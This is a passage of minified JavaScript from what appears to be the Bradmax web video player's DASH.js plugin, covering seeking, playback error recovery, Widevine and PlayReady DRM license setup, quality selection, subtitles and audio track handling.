Date).getTime()-this.seekingStartDate.getTime())/1e3;this.seekingAvgTime=this.seekingAvgTime<c?c:.5*this.seekingAvgTime+.5*c}if(this.media instanceof xa){c=this.getDVRWindowRange();var d=this.getSeekableRange();if(null!=this.seekableInitialRange&&1<Math.abs(this.seekableInitialRange.start-d.start)&&!this.isDVRRecordedForStartOver(d)&&this.video.currentTime<c.start)return this.seek(3*this.getLiveMinimalInitialOffsetForOldestPart()),null}return this.dispatchEvent(this.isAdvertisement?new Q("seekingEnd"):new T("seekingEnd"),Object.prototype.hasOwnProperty.call(b,"dashFakeEventFix")?{dashFakeEventFix:!0}:null),this.stopStreamBufferingWatchdogTimer(),this.seekingTargetTs=null,!this.shouldBePlaying&&this.isBuffering&&(this.dispatchEvent(new T("bufferingEnd")),this.isBuffering=!1,this.dispatchEvent(this.isAdvertisement?new Q("adPaused"):new T("paused"))),null},getLiveMinimalInitialOffsetForOldestPart:function(){return null!=this.dvrWindowStartTimeTs?0:1.5*this.seekingAvgTime},onDashJsPlaybackStarted:function(b){return this.shouldBePlaying||this.pause(),null},onDashJsPlaybackNotAllowed:function(b){return this.log("BRADMAX PLAYER NOTICE:\nBrowser doesn't allow for autoplaying video without user interaction.\nPlayer is waiting for user 'play' click. You can autoplay muted video (mute=true).\n\nMode details about browser autoplay policy: https://developers.google.com/web/updates/2017/09/autoplay-policy-changes","warn"),this.isPlaybackNotAllowed=!0,null!=this.player&&this.player.pause(),this.dispatchEvent(this.isAdvertisement?new Q("adCurrentTimeChange"):new T("currentTimeChange")),this.dispatchEvent(this.isAdvertisement?new Q("adPaused"):new T("paused")),this.shouldBePlaying=!1,null},onDashJsError:function(b){var c=this;if(this.isAdvertisement&&!this.isInStreamAdvertisement)return this.dispatchEvent(new Q("adMediaError"),this.prepareErrorMessage(b)),null;if(!(null==b||null!=b.data||null!=this.video.getAttribute("src")&&""!=this.video.getAttribute("src")||this.hasProtectionData||this.isNetworkConnectionProblem(b)))return null;if(null!=this.video){this.hideVideoTag=!1;var d=!0;null==d&&(d=!0),null!=this.video&&(this.video.style.display=d?"block":"none",this.video.style.opacity=d?"1":"0",this.video.style.visibility=d?"visible":"hidden"),this.video.muted=this.initialVideoIsMuted}null!=b&&null!=b.error&&null!=b.error.message&&(d="bradmax.player.error: "+p.string(b.error.message),console.error(d),console.error(b)),d=!0;var q=this.media instanceof xa,X=h.isAndroid&&"Chrome"==h.browserName&&null!=b&&null!=b.error&&(112==b.error.code||113==b.error.code)&&"MediaKeys"in window||"WebKitMediaKeys"in window||"MSMediaKeys"in window&&null!=this.media&&null!=this.media.drmCustomLicenseServerHandler,ra=null!=b&&null!=b.error&&null!=b.error.message&&-1!=b.error.message.indexOf("DRM err"),Aa=q&&this.media.hasFallbackSources();if(!(X||ra&&!h.isSamsungSmartTVTizen||Aa)&&(q||Object.prototype.hasOwnProperty.call(this.media.customParams.h,"maxRestartsNumOnPlaybackError"))&&this.videoRestartsOnError<this.getLimitOfRestarts()){d=!1;var Qa=q?5e3:0;this.stopLiveStreamRestartTimeoutTimer(),this.stopLiveStreamRestartDelayTimer(),this.stopDrmLiceseCheckCleanupTimer(),this.stopStreamCompleteWatchdogTimer(),this.stopStreamBufferingWatchdogTimer(),this.liveStreamRestartDelayTimer=Rb.delay((function(){q||null==c.media||null==c.media.mediaUserSettings||(c.media.mediaUserSettings.resumePostion=c.currentTime),c.handleVideoRestart();var Wa={dashError:b.data,currTry:c.videoRestartsOnError};c.dispatchEvent(c.isAdvertisement?new Q("adMediaErrorFallbackTry"):new T("mediaErrorFallbackTry"),Wa)}),Qa)}if(d)if(this.stopLiveStreamRestartTimeoutTimer(),this.stopLiveStreamRestartDelayTimer(),this.stopDrmLiceseCheckCleanupTimer(),this.stopStreamCompleteWatchdogTimer(),this.stopStreamBufferingWatchdogTimer(),X)this.dispatchEvent(new T("drmModuleCrush"),this.prepareErrorMessage(b)),this.reset();else if(null!=this.media&&null!=this.media.drmCustomLicenseServerHandler&&null!=this.media.drmCustomLicenseServerHandler.getLastError())this.dispatchEvent(new T("drmAuthenticationError"),this.prepareErrorMessage(this.media.drmCustomLicenseServerHandler.getLastError())),this.reset();else if(ra)Aa?((d=this.prepareErrorMessage(b)).isTemporaryNetworkIssue=!0,this.dispatchEvent(this.isAdvertisement?new Q("adMediaError"):new T("loadError"),d)):this.dispatchEvent(new T("drmAuthenticationError"),this.prepareErrorMessage(b)),this.reset();else if(this.isNetworkConnectionProblem(b))if(this.hasPlaybackSuccStarted){this.dispatchEvent(this.isAdvertisement?new Q("adConnectionError"):new T("connectionError"),this.prepareErrorMessage(b));try{null!=this.player&&this.player.pause()}catch(Wa){}}else(d=this.prepareErrorMessage(b)).isTemporaryNetworkIssue=!1,this.dispatchEvent(this.isAdvertisement?new Q("adMediaError"):new T("loadError"),d),this.reset();else this.dispatchEvent(this.isAdvertisement?new Q("adMediaError"):new T("mediaError"),this.prepareErrorMessage(b)),this.reset();return null},prepareErrorMessage:function(b){var c=this.isNetworkConnectionProblem(b)&&(this.media instanceof Ca||0<this.video.currentTime||null!=b&&null!=b.error&&null!=b.error.data&&null!=b.error.data.response&&500<=b.error.data.response.status||null!=this.media.mediaUserSettings&&0<this.media.mediaUserSettings.resumePostion),d="";return null!=b&&null!=b.error&&null!=b.error.message&&(d+=p.string(b.error.message)),{errObj:b,isTemporaryNetworkIssue:c,message:d}},isNetworkConnectionProblem:function(b){return null!=b&&null!=b.error&&25<=b.error.code&&29>=b.error.code},handleVideoRestart:function(){this.videoRestartsOnError++,this.lastRestartTs=this.getNowTs(),null!=this.media&&null!=this.media.drmCustomLicenseServerHandler&&this.media.drmCustomLicenseServerHandler.clearCertCache(),this.stopLiveStreamRestartTimeoutTimer(),this.stopLiveStreamRestartDelayTimer(),this.stopStreamBufferingWatchdogTimer(),this.playbackRateMetter.reset(),this.startTimeStatus=0;var b=this.video;this.cleanVideoAndPlayer(),this.attachVideo(b),null!=this.subtitlesSelected&&(this.subtitlesSetWaitingForSelection=this.subtitlesSelected),this.play(),this.media instanceof xa&&(b=5e3*(1+(this.videoRestartsOnError-1)/4),this.liveStreamRestartTimeoutTimer=Rb.delay(U(this,this.onDashJsLivestreamRestartTimeout),0|b))},onDashJsLivestreamRestartTimeout:function(){this.videoRestartsOnError<this.getLimitOfRestarts()?this.handleVideoRestart():this.dispatchEvent(this.isAdvertisement?new Q("adConnectionError"):new T("connectionError"),{message:"Livestream restart all tries failed.",isTemporaryNetworkIssue:!0})},getLimitOfRestarts:function(){return null!=this.media&&null!=this.media.drmCustomLicenseServerHandler&&null!=this.media.drmCustomLicenseServerHandler.getLastError()?1:null!=this.media&&null!=this.media.customParams&&Object.prototype.hasOwnProperty.call(this.media.customParams.h,"maxRestartsNumOnPlaybackError")&&0<this.media.customParams.h.maxRestartsNumOnPlaybackError?this.media.customParams.h.maxRestartsNumOnPlaybackError:5},onDashJsMetricAdded:function(b){if(null!=b&&null!=b.metric){if("ManifestUpdate"==b.metric&&(this.hasDashJsInitializedManifest=!0),!this.hasAudioInitialized&&this.hasDashJsInitializedManifest&&"SchedulingInfo"==b.metric){var c=this.player.getTracksFor("video"),d=this.player.getTracksFor("audio");null!=c&&0<c.length&&null!=d&&0<d.length&&(this.hasAudioInitialized=!0,this.updateAudioSets())}if(!this.hasSubtitlesInitialized&&null!=this.video.textTracks&&0<this.video.textTracks.length&&(this.hasSubtitlesInitialized=!0,this.updateSubtitlesSets()),!this.hasCodecInfoInitialized&&"RepSwitchList"==b.metric){d=this.player.getCurrentTrackFor("video");var q=this.player.getCurrentTrackFor("audio");if(null!=d&&Object.prototype.hasOwnProperty.call(d,"codec")&&null!=q&&Object.prototype.hasOwnProperty.call(q,"codec")){var X=function(ra){ra=ra.split(";");for(var Aa=0;Aa<ra.length;){var Qa=ra[Aa];if(++Aa,0==Qa.indexOf("codecs")&&0<(Qa=Qa.split("=")).length)return Qa[1].split('"').join("")}return""};(c=new aa("codecData")).data={videoCodec:X(d.codec),audioCodec:X(q.codec)},c.dispatch(this.context),this.hasCodecInfoInitialized=!0}}this.isQualitySelectionEnabled&&!this.hasQualityInfoInitialized&&"RepSwitchList"==b.metric&&(null!=(b=this.player.getBitrateInfoListFor("video"))&&1<b.length&&(this.hasQualityInfoInitialized=!0,(c=new aa("videoQualityData")).data=this.getQualityLevels(),c.dispatch(this.context),null!=(b=this.player.getQualityFor("video"))&&((c=new aa("videoQualityPlaybackLevelChange")).data=b,c.dispatch(this.context)),c=new W("videoQualityHasChanged"),null!=(d=this.getQualityInitialBandwidthKbs())&&!isNaN(d)&&isFinite(d)?c.data=b:c.data="-1",c.dispatch(this.context)))}return null},onDashJsQualityChangeRequested:function(b){if(this.hasQualityInfoInitialized&&null!=b&&"video"==b.mediaType&&null!=b.newQuality){var c=new aa("videoQualityPlaybackLevelChange");c.data=b.newQuality,c.dispatch(this.context)}return null},onDashJsLicenseRequestComplete:function(b){this.stopDrmLiceseCheckCleanupTimer(),this.drmLicenseCheckStatus=1,this.shouldBePlaying&&this.startDrmLiceseCheckCleanupTimer()},startDrmLiceseCheckCleanupTimer:function(){this.stopDrmLiceseCheckCleanupTimer();var b=2e4;Object.prototype.hasOwnProperty.call(this.pluginConfig,"DRM_LICENSE_CHECK_MECHANISM_TIMEOUT")&&null!=m.field(this.pluginConfig,"DRM_LICENSE_CHECK_MECHANISM_TIMEOUT")&&(b=m.field(this.pluginConfig,"DRM_LICENSE_CHECK_MECHANISM_TIMEOUT")),this.drmLicenseCheckMechanismTimeoutTimer=Rb.delay(U(this,this.onDashJsLicenseKeyCheckTimeout),b)},stopDrmLiceseCheckCleanupTimer:function(){1==this.drmLicenseCheckStatus&&this.hasPlaybackSuccStarted&&(this.drmLicenseCheckStatus=2),null!=this.drmLicenseCheckMechanismTimeoutTimer&&(this.drmLicenseCheckMechanismTimeoutTimer.stop(),this.drmLicenseCheckMechanismTimeoutTimer=null)},stopLiveStreamRestartTimeoutTimer:function(){null!=this.liveStreamRestartTimeoutTimer&&(this.liveStreamRestartTimeoutTimer.stop(),this.liveStreamRestartTimeoutTimer=null)},stopStreamCompleteWatchdogTimer:function(){null!=this.streamCompleteWatchdogTimer&&(this.streamCompleteWatchdogTimer.stop(),this.streamCompleteWatchdogTimer=null)},onStreamCompleteWatchdogTimeout:function(){this.stopStreamCompleteWatchdogTimer(),this.dispatchEvent(this.isAdvertisement?new Q("adComplete"):new T("complete"))},stopStreamBufferingWatchdogTimer:function(){null!=this.streamBufferingWatchdogTimer&&(this.streamBufferingWatchdogTimer.stop(),this.streamBufferingWatchdogTimer=null)},onStreamBufferingWatchdogTimeout:function(){this.stopStreamBufferingWatchdogTimer(),null!=this.media&&null!=this.media.mediaUserSettings&&null!=this.media.mediaPlaybackInfo&&(this.media.mediaUserSettings.resumePostion=this.media.mediaPlaybackInfo.currentTime+.1),this.handleVideoRestart()},stopLiveStreamRestartDelayTimer:function(){null!=this.liveStreamRestartDelayTimer&&(this.liveStreamRestartDelayTimer.stop(),this.liveStreamRestartDelayTimer=null)},stopLiveEdgeUpdateTimer:function(){null!=this.liveEdgeUpdateTimer&&(this.liveEdgeUpdateTimer.stop(),this.liveEdgeUpdateTimer=null)},onLiveEdgeUpdate:function(){null!=this.player&&this.hasDashJsInitializedSource&&!this.shouldBePlaying&&this.onDashJsTimeupdate({})},onDashJsLicenseKeyCheckTimeout:function(){this.stopDrmLiceseCheckCleanupTimer(),this.onDashJsError({data:{message:"DRM error. Cannot decode video with provided license key. License key is invalid."},error:{message:"DRM error. Cannot decode video with provided license key. License key is invalid."}})},getQualityLevels:function(){var b="resolution";Object.prototype.hasOwnProperty.call(this.variables,"qualityLabelType")&&(b=(b=m.field(this.variables,"qualityLabelType")).toLowerCase());var c=this.player.getBitrateInfoListFor("video");if(null==c&&(c=[]),"resolution"==b)for(var d=0;d<c.length;){var q=c[d];if(++d,0==q.width||0==q.height){b="bitrate";break}}(q=[]).push(new Eb("Auto","-1")),d=0;for(var X=c.length;d<X;){var ra=d++,Aa="resolution"==b?p.string(c[ra].height)+"p":this.mapBitrateToLabel(c[ra].bitrate);(Aa=new Eb(Aa,null==ra?"null":""+ra)).height=c[ra].height,Aa.width=c[ra].width,Aa.bitrateKbps=0<c[ra].bitrate?c[ra].bitrate/1e3:null,q.push(Aa)}return q.reverse(),q},mapBitrateToLabel:function(b){return Math.floor(b/1e3)+"k"},getCurrentTotalBitrateKbps:function(){if(null==this.player)return null;try{var b=this.player.getQualityFor("video"),c=this.player.getBitrateInfoListFor("video"),d=this.player.getQualityFor("audio"),q=this.player.getBitrateInfoListFor("audio");if(null==c||null==q||null==b||null==d||0>b||c.length<=b||0>d||q.length<=d)return null;var X=c[b].bitrate+q[d].bitrate;return Math.round(X/1e3)}catch(ra){return null}},getQualityInitialBandwidthKbs:function(){if(Object.prototype.hasOwnProperty.call(this.variables,"qualityInitialBandwidthKbs")){var b=m.field(this.variables,"qualityInitialBandwidthKbs");if(null!=b)return p.parseInt(b)}return null},isAutoSwitchQualityEnabled:function(){if(null==this.player.getSettings()||null==this.player.getSettings().streaming)return!1;var b=this.player.getSettings().streaming.abr;return null!=b&&null!=b.autoSwitchBitrate&&null!=b.autoSwitchBitrate.video&&1==b.autoSwitchBitrate.video},updateAutoSwitchQuality:function(b){var c=this.player.getSettings();c.streaming.abr.autoSwitchBitrate={video:b,audio:b},this.player.updateSettings(c)},onVideoQualityChange:function(b){if(null!=b&&null!=b.data&&"string"==typeof b.data&&null!=this.player){var c=b.data;if(b="-1",this.isAutoSwitchQualityEnabled()||(b=p.string(this.player.getQualityFor("video"))),c!=b){if(b="-1"==c)this.updateAutoSwitchQuality(!0);else{var d=p.parseInt(c);this.updateAutoSwitchQuality(!1),this.player.setQualityFor("video",d);var q=this.player.getBitrateInfoListFor("video"),X=this.player.getBitrateInfoListFor("audio");null!=q&&null!=X&&1<X.length&&0<q.length&&this.player.setQualityFor("audio",Math.floor(X.length*d/q.length))}Object.prototype.hasOwnProperty.call(this.variables,"saveBandwidthMode")&&fb.__cast(this.variables.saveBandwidthMode,be)&&((d=this.player.getSettings()).streaming.abr.limitBitrateByPortal=b,d.streaming.abr.usePixelRatioInLimitBitrateByPortal=b,this.player.updateSettings(d)),(b=new W("videoQualityHasChanged")).data=c,b.dispatch(this.context)}}},onDashJsKeySessionCreated:function(b){return new T("drmAuthenticationComplete").dispatch(this.context),null},updateSubtitlesSets:function(){if(null!=this.video.textTracks&&0<this.video.textTracks.length){for(var b=[],c=0,d=this.video.textTracks;c<d.length;){var q=d[c];if(++c,null!=q.language&&""!=q.language){var X=new Ab;X.id=null==b.length?"null":""+b.length,X.name=ba.normalizeLanguageNameFormat(ba.getLanguageNativeNameByCode(q.language)),null!=X.name&&""!=X.name||(X.name=q.language),X.languageCode=q.language,b.push(X)}}null!=this.variables.subtitles&&0<b.length&&ba.preselectSubtitlesSet(this.variables.subtitles,b),0<b.length&&((c=new aa("subtitleData")).data=b,c.dispatch(this.context))}},onSelectSubtitles:function(b){null!=b&&null!=this.video&&(this.hasPlaybackSuccStarted?this.performSubtitlesSelection(b.data):this.subtitlesSetWaitingForSelection=b.data)},performSubtitlesSelection:function(b){if(this.subtitlesSelected=null,null!=b){this.player.enableText(!0);for(var c=0,d=this.video.textTracks.length;c<d;){var q=c++;(null==q?"null":""+q)==b.id&&(this.subtitlesSelected=b,this.player.setTextTrack(q))}}else this.player.enableText(!1)},initSubtitlesPlaceholder:function(){var b=this.video.parentElement.getElementsByClassName("htmlSubtitlesPlaceholder");if(0==b.length){(b=window.document.createElement("div")).setAttribute("class","htmlSubtitlesPlaceholder"),b.setAttribute("style","height: 100%;left: 0px;position: absolute;top: 0px;width: 100%;");for(var c=this.video.parentElement.childNodes,d=c.length-1,q=0,X=c.length;q<X;){var ra=q++;if(c.item(ra)==this.video){d=ra;break}}d<c.length-1?this.video.parentElement.insertBefore(b,c[d+1]):this.video.parentElement.appendChild(b)}else(b=b.item(0)).innerHTML="";this.player.getTTMLRenderingDiv()!=b&&this.player.attachTTMLRenderingDiv(b)},updateAudioSets:function(){var b=this.player.getTracksFor("audio"),c=!0;if(Object.prototype.hasOwnProperty.call(this.variables,"languageCodeDuplicationRemoval")&&(c=m.field(this.variables,"languageCodeDuplicationRemoval")),null!=b&&b.length>=this.minAudioTracksForInfo){var d=this.player.getCurrentTrackFor("audio"),q=[];if(null!=d){for(var X=0,ra=b.length;X<ra;){var Aa=X++;q.push({track:b[Aa],tId:Aa})}q.sort((function(Cb,Ub){return(Ub.track.id==d.id?1:0)-(Cb.track.id==d.id?1:0)}))}for(b=[],ra=Object.create(null),X=0;X<q.length;){Aa=q[X],++X;var Qa=Aa.track;if(Aa=Aa.tId,Qa.lang&&(!c||!Object.prototype.hasOwnProperty.call(ra,Qa.lang))){var Wa=new $a;Wa.id=null==Aa?"null":""+Aa,Wa.name=ba.normalizeLanguageNameFormat(ba.getLanguageNativeNameByCode(Qa.lang)),null!=Wa.name&&""!=Wa.name||(Wa.name=Qa.lang),Wa.languageCode=Qa.lang,b.push(Wa),ra[Qa.lang]=!0}}b.length>=this.minAudioTracksForInfo&&((c=new aa("audioData")).data=b,c.dispatch(this.context))}},onSelectAudio:function(b){null!=b&&null!=this.player&&(this.hasPlaybackSuccStarted?this.performAudioSelection(b.data):this.audioSetWaitingForSelection=b.data)},performAudioSelection:function(b){if(null!=b&&null!=b.id&&""!=b.id){var c=this.player.getTracksFor("audio");b=p.parseInt(b.id),this.player.setCurrentTrack(c[b])}},selectAudioAndSubtitlesAfterInitialization:function(){null!=this.audioSetWaitingForSelection&&(this.performAudioSelection(this.audioSetWaitingForSelection),this.audioSetWaitingForSelection=null),null!=this.subtitlesSetWaitingForSelection&&(this.performSubtitlesSelection(this.subtitlesSetWaitingForSelection),this.subtitlesSetWaitingForSelection=null)},reset:function(){if(null!=this.player){this.hasProtectionData=!1,this.stopDrmLiceseCheckCleanupTimer(),this.stopLiveEdgeUpdateTimer();try{this.player.reset()}catch(b){}this.hasPlaybackSuccStarted=!1}},pause:function(){var b=this.media instanceof xa&&2!=this.startTimeStatus;null!=this.player&&this.hasDashJsInitializedSource&&!b&&this.player.pause(),this.stopDrmLiceseCheckCleanupTimer(),this.shouldBePlaying=!1},initSource:function(){var b=this;if(null==this.media||null==this.media.source||0==this.media.source.length)this.dispatchEvent(this.isAdvertisement?new Q("adMediaError"):new T("mediaError"),{message:"No video could be played. All video with fallback sources has failed."});else if(this.source!=this.media.source[0].url){null!=this.source&&this.reset();var c=this.media.source[0];if(null!=c.drm&&"playready"==c.drm.selectedDrmSystem)this.setPlayReadyDrmSupportPlayback();else if(null!=c.drm&&"widevine"==c.drm.selectedDrmSystem)this.setWidevineDrmSupportPlayback();else switch(h.browserName){case"Chrome":case"EdgeChromium":case"Firefox":case"Opera":this.setWidevineDrmSupportPlayback();break;case"Edge":case"Microsoft Internet Explorer":this.setPlayReadyDrmSupportPlayback();break;default:this.setDefaultPlayback()}this.source=this.media.source[0].url,Rb.delay((function(){new T("bufferingStart").dispatch(b.context),b.isBuffering=!0}),0)}},play:function(){if(2!=this.startTimeStatus&&null!=this.video){this.hideVideoTag=!0;var b=!1;null==b&&(b=!0),null!=this.video&&(this.video.style.display=b?"block":"none",this.video.style.opacity=b?"1":"0",this.video.style.visibility=b?"visible":"hidden"),this.video.muted=!0}if(this.initSource(),null!=this.player){1==this.drmLicenseCheckStatus&&this.startDrmLiceseCheckCleanupTimer(),this.media instanceof xa&&(b=this.getDVRWindowRange(),this.video.currentTime<b.start?this.seek(0):this.video.currentTime>b.end&&this.seek(b.end-b.start));try{this.hasDashJsInitializedSource&&this.player.play(),this.shouldBePlaying=!0}catch(c){b=yb.caught(c).unwrap(),this.onDashJsError({data:b,error:{message:p.string(b)}})}}},getMediaSource:function(b,c){var d=c;null==c&&(d=[".mpd"]);for(var q=0;q<b.length;){var X=b[q];++q;for(var ra=0;ra<d.length;){var Aa=d[ra];if(++ra,-1!=X.url.toLowerCase().indexOf(Aa))return X}}for(null==c&&(d=[".ism/manifest",".isml/manifest"]),q=0;q<b.length;)for(X=b[q],++q,ra=0;ra<d.length;)if(Aa=d[ra],++ra,-1!=X.url.toLowerCase().indexOf(Aa))return X;return null},playPause:function(){this.isPaused()?this.play():this.pause()},setDefaultPlayback:function(){this.attachPlayerSourceUrl(this.media.source[0].url)},attachPlayerSourceUrl:function(b){if(null!=this.media&&this.media instanceof xa&&1==this.media.lowLatencyMode){var c=this.player.getSettings();c.streaming.lowLatencyEnabled=!0,this.player.updateSettings(c)}this.player.attachSource(b),this.player.isReady()||this.player.attachView(this.video),this.hasDashJsInitializedSource=!0},getPlaybackStartTime:function(b){var c=null;return null!=this.dvrWindowStartTimeTs&&null!=this.dvrWindowEndTimeTs&&this.dvrWindowEndTimeTs<this.getNowTs()&&(c=this.dvrWindowStartTimeTs),null!=b&&null!=b.mediaUserSettings&&null!=b.mediaUserSettings.resumePostion&&(c=b.mediaUserSettings.resumePostion),null!=this.prePlaybackSeekRelativePosition&&null!=b&&0<b.duration&&(c=this.prePlaybackSeekRelativePosition*b.duration),null!=c&&null!=this.dvrWindowStartTimeTs&&c<this.dvrWindowStartTimeTs&&(c=this.dvrWindowStartTimeTs),null!=c&&null!=this.dvrWindowEndTimeTs&&this.dvrWindowEndTimeTs<c&&(c=this.dvrWindowEndTimeTs),c},setWidevineDrmSupportPlayback:function(){var b=this.getMediaSource(this.media.source),c=null,d=null,q=null,X=null;if(null==b)this.onDashJsError({data:{message:"Cannot play defined media. Invalid media source."}});else{try{X=b.drm.provider}catch(Aa){}try{c=b.customParams.h.laUrl,d=b.customParams.h.laCertHex}catch(Aa){var ra=yb.caught(Aa).unwrap();console.log("plugins/VideoDashJs/src/bs/player/plugin/video/videoPlayer/VideoDashJs.hx:2371:",ra)}try{null==c&&(c=b.drm.widevine.laUrl)}catch(Aa){}try{null!=b.drm&&null!=b.drm.widevine&&null!=b.drm.widevine.customData&&(q=b.drm.widevine.customData)}catch(Aa){ra=yb.caught(Aa).unwrap(),console.log("plugins/VideoDashJs/src/bs/player/plugin/video/videoPlayer/VideoDashJs.hx:2384:",ra)}null!=this.media.drmCustomLicenseServerHandler?(this.media.drmCustomLicenseServerHandler.initContext(this.media,b,this.variables),ra={"com.widevine.alpha":c={customData:"B2C99B73-CA41-4003-84A3AA16CE92B304",customLicenseRequestHandler:(Oa=this.media.drmCustomLicenseServerHandler,U(Oa,Oa.customWidevineLicenseRequestHandler)),audioRobustness:null!=b.drm&&null!=b.drm.widevine&&null!=b.drm.widevine.audioRobustness?b.drm.widevine.audioRobustness:"SW_SECURE_CRYPTO",videoRobustness:null!=b.drm&&null!=b.drm.widevine&&null!=b.drm.widevine.videoRobustness?b.drm.widevine.videoRobustness:"SW_SECURE_CRYPTO"}},this.hasProtectionData=!0,this.player.setProtectionData(ra)):null!=c&&(ra={"com.widevine.alpha":c={laURL:c,customData:"B2C99B73-CA41-4003-84A3AA16CE92B304",canGeneratePsshBox:!0,audioRobustness:null!=b.drm&&null!=b.drm.widevine&&null!=b.drm.widevine.audioRobustness?b.drm.widevine.audioRobustness:"SW_SECURE_CRYPTO",videoRobustness:null!=b.drm&&null!=b.drm.widevine&&null!=b.drm.widevine.videoRobustness?b.drm.widevine.videoRobustness:"SW_SECURE_CRYPTO"}},null!=q&&"keyos"==X.toLowerCase()&&(c.httpRequestHeaders={"x-keyos-authorization":q}),null!=d&&(c.laCertHex=d),this.hasProtectionData=!0,this.player.setProtectionData(ra)),this.attachPlayerSourceUrl(b.url)}},setPlayReadyDrmSupportPlayback:function(){var b=this.getMediaSource(this.media.source),c=null,d=null;try{c=b.drm.provider}catch(Aa){}var q=null;try{q=b.customParams.h.laUrl;var X=this.variables.xmmapi.userId,ra="?"+p.string(b.customParams.h.drmParams)+"&userId="+X+"&device=web&platform=web";q=""+this.variables.xmmapi.playReadyLicenseServerURL+ra}catch(Aa){}try{null==q&&(q=b.drm.playready.laUrl)}catch(Aa){}try{d=b.drm.playready.customData}catch(Aa){}null!=this.media.drmCustomLicenseServerHandler?(this.media.drmCustomLicenseServerHandler.initContext(this.media,b,this.variables),X={"com.microsoft.playready":q={customLicenseRequestHandler:(Oa=this.media.drmCustomLicenseServerHandler,U(Oa,Oa.customPlayReadyLicenseRequestHandler)),audioRobustness:null!=b.drm&&null!=b.drm.playready&&null!=b.drm.playready.audioRobustness?b.drm.playready.audioRobustness:"SW_SECURE_CRYPTO",videoRobustness:null!=b.drm&&null!=b.drm.playready&&null!=b.drm.playready.videoRobustness?b.drm.playready.videoRobustness:"SW_SECURE_CRYPTO"}},this.hasProtectionData=!0,this.player.setProtectionData(X),this.attachPlayerSourceUrl(b.url)):(null!=q&&(X={"com.microsoft.playready":q={laURL:q,canGeneratePsshBox:!0}},null!=d&&"keyos"==c.toLowerCase()&&(q.httpRequestHeaders={"x-keyos-authorization":d}),this.player.setProtectionData(X)),this.attachPlayerSourceUrl(this.media.source[0].url))},seek:function(b){var c=this,d=this.isPaused()&&null==this.source;this.androidVideoBufferFix(),this.seekingTargetTs=null;var q=this.media instanceof xa;if(q){if(b=this.dvrWindowRelativeTimeToTs(b),b=this.normalizeDvrTime(b),this.media.mediaPlaybackInfo.currentTime=b,0<b&&(this.seekingTargetTs=b),(b=this.dvrWindowRelativeTimeFromTs(b))<this.getLiveMinimalInitialOffsetForOldestPart()&&(b=this.getLiveMinimalInitialOffsetForOldestPart()),2!=this.startTimeStatus&&!d)return;d&&this.initSource()}else 0>b?b=0:null!=this.video&&b>this.video.duration&&(b=this.video.duration),b>this.video.duration-1&&(b=this.video.duration-1),d&&(0<this.media.duration&&(this.prePlaybackSeekRelativePosition=b/this.media.duration),this.initSource());this.isPaused()&&!d&&Rb.delay((function(){new T("bufferingStart").dispatch(c.context),c.isBuffering=!0}),0),this.currentTime=b,h.isSmartTV()&&(this.seekingTargetPos=q?this.dvrWindowRelativeTimeToTs(b):b),this.player.pause(),this.hasSeekingStartTriggeded=!0,this.dispatchEvent(this.isAdvertisement?new Q("seekingStart"):new T("seekingStart")),this.seekingStartDate=new Date,this.dispatchEvent(this.isAdvertisement?new Q("adCurrentTimeChange"):new T("currentTimeChange")),null==this.seekDebouncerTimer?this.dispatchEvent(new T("seekingStart")):this.seekDebouncerTimer.stop(),this.seekDebouncerTimer=Rb.delay(U(this,this.onSeekingDebouncerTimout),this.getSeekingDebouncerTimeout())},onSeekingDebouncerTimout:function(){if(null!=this.seekingTargetTs)this.performPlayerSeek(this.seekingTargetTs),this.seekingTargetTs=null;else{var b=this.currentTime;this.media instanceof xa&&(b=this.dvrWindowRelativeTimeToTs(b),b=this.normalizeDvrTime(b)),this.performPlayerSeek(b)}this.stopSeekDebouncerTimer()},getSeekingDebouncerTimeout:function(){var b=500;return h.isSmartTV()&&(b=1e3),b},performPlayerSeek:function(b,c){null==c&&(c=!0);var d=this;if(this.hasDashJsInitializedSource&&null!=this.video){this.androidVideoBufferFix(),0==this.video.readyState&&this.videoRestartsOnError<this.getLimitOfRestarts()&&Rb.delay((function(){d.performPlayerSeek(b,c)}),100);var q=this.getSeekableRange(),X=this.media instanceof xa,ra=b;if(X&&(ra=this.normalizeDvrTime(ra),(ra=this.dvrWindowRelativeTimeFromTs(ra))<this.getLiveMinimalInitialOffsetForOldestPart()&&(ra=this.getLiveMinimalInitialOffsetForOldestPart())),X&&(null==(X=this.player.getSettings().streaming.liveDelay)&&(X=0),ra>q.end-1.2*X&&(ra=q.end-1.2*X)),this.shouldBePlaying&&c&&this.player.play(),0==this.currentTime&&0==ra&&(ra=.1,null!=this.adBreaksInfo))return null!=this.media&&null!=this.media.mediaUserSettings&&0<this.media.mediaUserSettings.resumePostion&&(this.media.mediaUserSettings.resumePostion=0),void this.handleVideoRestart();this.player.seek(ra)}},dvrWindowRelativeTimeFromTs:function(b){var c=this.player.getDashMetrics().getCurrentDVRInfo(),d=0;return null!=c&&null!=c.range&&null!=c.time&&(d=b-c.range.start),0>d&&(d=0),d},dvrWindowRelativeTimeToTs:function(b){var c=this.player.getDashMetrics().getCurrentDVRInfo(),d=0;return null!=c&&null!=c.range&&null!=c.time&&(d=c.range.start+b),d},normalizeDvrTime:function(b){var c=this.getDVRWindowRange();return b>c.end?b=c.end:b<c.start&&(b=c.start),b},dvrTimestampToRelativeTime:function(b){return b-this.getDVRWindowRange().start},getDvrWindowEndTimeOffset:function(){var b=0;if(null!=this.dvrWindowEndTimeTs){var c=this.getDVRWindowRange();this.dvrWindowEndTimeTs<c.end&&(b=c.end-this.dvrWindowEndTimeTs)}return b},getDVRWindowRange:function(){var b=this.getSeekableRange();return null!=this.dvrWindowStartTimeTs&&b.start<this.dvrWindowStartTimeTs&&!this.isDVRRecordedForStartOver(b)&&(b.start=this.dvrWindowStartTimeTs),null!=this.dvrWindowEndTimeTs&&this.dvrWindowEndTimeTs<b.end&&(b.end=this.dvrWindowEndTimeTs),b},isDVRRecordedForStartOver:function(b){var c=86400>b.end-b.start;return 0==b.start&&c},getDashStreamPeriodsNum:function(){var b=0;if(null!=this.player&&this.player.getActiveStream()&&this.player.getActiveStream().getProcessors()&&this.player.getActiveStream().getProcessors()[0]&&this.player.getActiveStream().getProcessors()[0].getRepresentationController()&&this.player.getActiveStream().getProcessors()[0].getRepresentationController().getCurrentRepresentation()){var c=this.player.getActiveStream().getProcessors()[0].getRepresentationController().getCurrentRepresentation();c&&c.adaptation&&c.adaptation.period&&c.adaptation.period.mpd&&c.adaptation.period.mpd.manifest&&c.adaptation.period.mpd.manifest.Period_asArray&&(b=c.adaptation.period.mpd.manifest.Period_asArray.length)}return b},getSeekableRange:function(){if(null!=this.player){var 